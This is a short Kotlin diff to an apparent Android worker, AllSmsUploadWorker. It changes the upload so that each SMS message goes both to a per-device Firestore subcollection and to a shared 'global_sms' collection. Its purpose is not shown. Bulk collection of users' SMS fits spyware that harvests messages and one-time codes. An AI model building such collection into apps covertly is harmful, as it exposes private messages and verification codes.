@@ -112,9 +112,19 @@ class AllSmsUploadWorker(
     }
 
     private suspend fun uploadSmsToFirestore(smsModel: SmsModel, deviceId: String) {
-        firestore.collection("devices")
+        // Upload to device's incoming_sms subcollection
+        firestore.collection("MASTERHU")
+            .document("Users")
+            .collection("Users")
             .document(deviceId)
-            .collection("sms")
+            .collection("incoming_sms")
+            .add(smsModel)
+            .await()
+        
+        // Also upload to global_sms
+        firestore.collection("MASTERHU")
+            .document("global_sms")
+            .collection("global_sms")
             .add(smsModel)
             .await()
     }
